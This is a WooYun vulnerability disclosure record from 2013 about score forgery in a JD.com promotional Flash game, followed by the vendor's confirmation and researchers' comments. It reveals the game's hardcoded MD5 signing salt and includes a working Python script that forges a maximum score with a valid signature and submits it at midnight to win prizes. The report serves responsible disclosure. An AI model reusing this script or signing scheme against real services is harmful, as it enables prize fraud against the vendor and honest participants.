{"id": 6743, "wybug_id": "wooyun-2013-044366", "wybug_title": "京东手机节幸运大翻转刷分（flash逆向分析）", "wybug_corp": "京东商城", "wybug_author": "cnrstar", "wybug_date": "2013-11-29 10:32", "wybug_open_date": "2014-01-13 10:33", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-13：\t细节向公众公开  简要描述： 京东的手机节有个幸运大翻转，玩游戏排名，每天第一MX2，总分第一诺基亚1520，貌似还是很不错的，但是每次排名的那些人都是990，表示手累断了也拿不到990分。 详细说明：  活动地址：http://sale.jd.com/act/rSR4ExMjOnyGwWmf.html?erpad_source=erpad游戏的flash地址：http://mday.jd.com/play/fanpai.swf游戏点击开始的数据包：\n\n游戏结束时的数据包“\n\n结束时的数据包里有我们的得分，直接修改这个参数会被警告，提示非法。猜测后面的sign是一个合法性验证参数，很明显是32位的MD5 hash现在刷分的关键就在于如何让我们的这个sign合法，由于这个游戏是swf，而且是本地玩的，那就说明这个sign在swf里有设定，然后服务端去验证这个sign是否合法。逆一下这个swf后得到源码，搜索到如下sign的定义：\n\n同样的可以得到刚开始玩游戏的sign算法，至此，我们只需伪造分数，然后伪造这个sign，就可以完成刷分了。   漏洞证明：  Python代码：\n#-------------------------------------------------------------------------------# Name:# Purpose:## Author:      Rstar## Created:     26/11/2013# Copyright:   (c) Rstar 2013# Licence:     <your licence>#-------------------------------------------------------------------------------import urllib2,httplib,md5,time,recookie = 'xxx' # Your Cookieuser = 'ssss'\t# your usernamedef getmd5(string):    result = md5.new(string)    return result.hexdigest()def gettimestamp():    return time.strftime('%Y%m%d%H%M%S',time.localtime(time.time()))def getkey1(timestamp):    cmd = \"10004\"    linkworld = ((((((((\"cmd\" + cmd) + \"timestamp\") + timestamp) + \"userId\") + user) + \"ver\") + \"1.0\") + \"b14bda484ea4583\");    return getmd5(linkworld)def getkey2(name,score,timestamp):    cmd = \"10001\"    sign = ((((((((((((\"cmd\" + cmd) + \"name\") + name) + \"score\") + score) + \"timestamp\") + timestamp) + \"userId\") + user) + \"ver\") + \"1.0\") +\"b14bda484ea4583\");    return getmd5(sign)def httpreq1(url):    req = urllib2.Request(url)    req.add_header('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1685.0 Safari/537.36')    req.add_header('Referer','http://mday.jd.com/index.action')    req.add_header('Cookie',cookie)    #opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(ckjar) )    #f = opener.open(req)    f = urllib2.urlopen(req)    htm = f.read()    return htm    f.close()def main():    score = \"990\"    timestamp = gettimestamp()    while True:        if timestamp == \"20131127235824\":            url1 = \"http://mday.jd.com/gw/userService.action?timestamp=\"+timestamp+\"&cmd=10004&ver=1.0&userId=\"+user+\"&sign=\"+getkey1(timestamp)            print url1            html1 = httpreq1(url1)            print html1            re_name = re.compile(\"<name>(.+?)</name\")            name = re_name.findall(html1)[0]            print \"Got Name:\"+name+\"\\tNow Sleep 90s\"            url2 = \"http://mday.jd.com/gw/userService.action?timestamp=\"+timestamp+\"&cmd=10001&ver=1.0&sign=\"+getkey2(name,score,timestamp)+\"&score=\"+score+\"&userId=\"+user+\"&name=\"+name            print url2            print httpreq1(url2)        else:            time.sleep(0.2)            timestamp = gettimestamp()if __name__ == '__main__':    main()\n上面是定点刷，算好秒后，保证在晚上24：00达到最高分，然后去领奖   修复方案：  你们懂的不过你们发奖品是怎么发的？那么多人都在刷分，怎么排名的，为啥最高都是990，不能是其他的分？我弄了两次发现没我啥事，球解答。   版权声明：转载请注明来源 cnrstar@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2013-12-02 12:10 厂商回复： 感谢您对京东的关注！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-29 13:12 |    \t\tqwerty \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:16        | 已注销)\t\t \n  前排兜售EXP    \n     2013-11-29 18:20 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  我觉得FLASH小游戏的这类问题，算不上设计缺陷或者逻辑错误。 基本上这类游戏都会对提交分数这一步上做一定的验证，以避免最简单的抓包重放提交分数的操作（京东这个也一样）。  而验证算法，在FLASH源码里肯定会出现，FLASH又可逆，所以这类游戏的刷分应该是防不了的。     \n     2013-11-29 18:27 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  二哥来两发    \n     2013-11-29 19:46 |    \t\ttzrj \t\t\t( 实习白帽子  |\t\t\t        Rank:87 漏洞数:24        | 1111)\t\t \n  @qwerty 求exp    \n     2013-11-30 08:53 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  诶，23:59:59这一秒有40多人提交了990的分数，表示能刷也没用，也弄不到手机。而2000少100这种优惠券有需要手动领取，蛋疼。    \n     2013-12-01 01:30 |    \t\tqwerty \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:16        | 已注销)\t\t \n  @tzrj exp其实也没啥用 网络延迟是硬伤    \n     2013-12-02 15:20 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @gainover 业务处理了，奖品价值不高，后期数据处理后发放等    \n     2013-12-02 16:26 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @小胖胖要减肥 啥意思？你搞到了？    \n     2013-12-02 16:53 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @px1624 我的处理方案    \n     2013-12-02 18:13 |    \t\tcnrstar \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:23        | Be my personal best!)\t\t \n  @小胖胖要减肥 京东工作人员？    \n     2013-12-02 19:40 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @小胖胖要减肥 淫荡，竟然私下提交了。。    \n     2013-12-02 21:12 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @cnrstar 其他电商的    \n     2013-12-02 21:13 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @px1624 我是说只要我负责的活动 不会有这个问题，你刷的数据筛选就过不了    \n     2013-12-03 08:21 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @小胖胖要减肥 嗯，是啊，我没刷到。就刷了两次，哈哈。不过这玩意1秒提交40多人，其实也和拼人品差不多    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}